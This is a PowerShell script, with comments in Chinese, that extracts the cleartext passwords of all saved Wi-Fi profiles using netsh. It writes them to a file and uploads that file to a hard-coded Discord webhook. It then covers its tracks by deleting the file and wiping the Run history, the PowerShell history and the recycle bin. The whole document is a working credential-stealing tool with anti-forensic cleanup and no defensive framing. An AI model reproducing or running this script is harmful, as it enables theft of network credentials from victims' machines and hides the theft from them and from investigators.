$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $_ | Out-Null
    (netsh wlan show profile name="$name" key=clear)
} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
    $pass = $_.Matches.Groups[1].Value.Trim()
    $_ | Out-Null
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD = $pass
    }
} | Format-Table -AutoSize | Out-String

$wifiFilePath = "$env:USERPROFILE\Desktop\wifi-passwords.txt"
$wifiProfiles | Out-File -FilePath $wifiFilePath

# 上传文件到 Discord
function Upload-Discord {
    param (
        [Parameter(Position=0, Mandatory=$true)]
        [string]$WebhookUrl,
        [Parameter(Position=1, Mandatory=$true)]
        [string]$FilePath
    )

    $fileStream = [System.IO.File]::OpenRead($FilePath)
    $fileName = Split-Path $FilePath -Leaf
    $fileContent = [System.Convert]::ToBase64String((Get-Content -Path $FilePath -Encoding Byte))

    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"

    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        $fileContent,
        "--$boundary--",
        ""
    ) -join $LF

    $headers = @{
        'Content-Type' = "multipart/form-data; boundary=$boundary"
    }

    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Headers $headers -Body $bodyLines
}

$discordWebhookUrl = "https://discordapp.com/api/webhooks/1123943138432651315/FA45yGcL3AtHQHvqdNXIcje5eVmucuS_nXBXOVNYNo0yHkoRh3APMrcUXgD6w2Dgs_U4"
Upload-Discord -WebhookUrl $discordWebhookUrl -FilePath $wifiFilePath

# 清理临时文件和历史记录
function Clean-Exfil {
    # 清空临时文件夹
    Remove-Item -Path $wifiFilePath -ErrorAction SilentlyContinue

    # 删除运行框历史记录
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

    # 删除 PowerShell 历史记录
    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

    # 清空回收站
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

if (-not ([string]::IsNullOrEmpty($ce))) {
    Clean-Exfil
}
